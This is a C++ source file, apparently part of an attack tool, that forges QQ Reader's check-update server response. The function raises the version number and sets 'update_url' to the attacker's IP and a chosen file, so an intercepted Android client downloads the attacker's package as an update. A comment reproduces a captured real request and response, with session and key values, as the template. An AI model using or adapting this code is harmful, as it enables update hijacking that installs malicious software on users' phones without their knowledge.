


#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "qqreader.h"
#include "..\\SdkVersion.h"
#include "../version.h"
#include "../HttpUtils.h"
#include "../FileOper.h"






int QQReader::prepareRespData(DWORD ulIP, string filepath, string filename) {

	string mainver = "9.6.9";
	string ver = "9.6.9.0888";//6.6.9.0888
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsonFormat =
		//https://itunes.apple.com/cn/app/qq%E9%98%85%E8%AF%BB-%E6%8B%A5%E6%9C%89%E6%B5%B7%E9%87%8F%E5%8E%9F%E8%91%97%E5%B0%8F%E8%AF%B4%E7%9A%84%E7%94%B5%E5%AD%90%E4%B9%A6%E9%98%85%E8%AF%BB%E5%99%A8/id487608658?mt=8
		"{\"baoyue_off_url\":\"\","
		"\"code\":\"0\",\"update_intro\":\"V%s版\",\"activedays\":1,"
		"\"baoyue_off_wording\":\"\","		//由于业务升级，当前版本将不再提供包月开通及续费服务，请升级至最新版本。
		"\"update_code\":1,\"update_version\":\"qqreader_%s_android\",\"quiz_url\":\"\",\"qqnum\":\"0\",\"message\":\"\","
		"\"cacheWindow\":\"1518688800000|1518705000000\",\"baoyue_onoff\":false,\"sid\":\"154598867519613\",\"baoyue_off_click\":true,"
		"\"port\":\"9080|9082|9084|9086\",\"domain\":\"ws.reader.qq.com\",\"update_url\":\"http://%s/%s\"}";		

	int ret = FALSE;


	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat, mainver.c_str(), ver.c_str(),szip.c_str(), filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);

	return m_filesize;
}




/*
GET /handleall HTTP/1.1
nosid: 1
action: checkupdate
timi:
cplatform: meizu
gselect: 1
qimei: 3f80ef4d047b3905
os: android
supportTS: 1
c_platform: meizu
mversion: 6.3.5.888
sid: 154598867519613
safekey: C7CE9066BE00E88BEFBAB1E21D822A64
ua: m2 note#m2cnote#22
c_version: qqreader_6.3.5.0888_android
themeid: 1000
channel: 10015252
Host: allreader.3g.qq.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 28 Dec 2018 09:30:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 767
Connection: keep-alive
Cache-Control: max-age=600

{"baoyue_off_url":"https://itunes.apple.com/cn/app/qq%E9%98%85%E8%AF%BB-%E6%8B%A5%E6%9C%89%E6%B5%B7%E9%87%8F%E5%8E%9F%E8%91%97%E5%B0%8F%E8%AF%B4%E7%9A%84%E7%94%B5%E5%AD%90%E4%B9%A6%E9%98%85%E8%AF%BB%E5%99%A8/id487608658?mt=8",
"code":"0","update_intro":"V6.6.9版","activedays":1,
"baoyue_off_wording":"由于业务升级，当前版本将不再提供包月开通及续费服务，请升级至最新版本。",
"update_code":1,"update_version":"qqreader_6.6.9.0888_android","quiz_url":"","qqnum":"0","message":"",
"cacheWindow":"1518688800000|1518705000000","baoyue_onoff":false,"sid":"154598867519613","baoyue_off_click":true,
"port":"9080|9082|9084|9086","domain":"ws.reader.qq.com","update_url":"http://misc.wcd.qq.com/app?packageName=com.qq.reader&channelId=10000382"}

*/
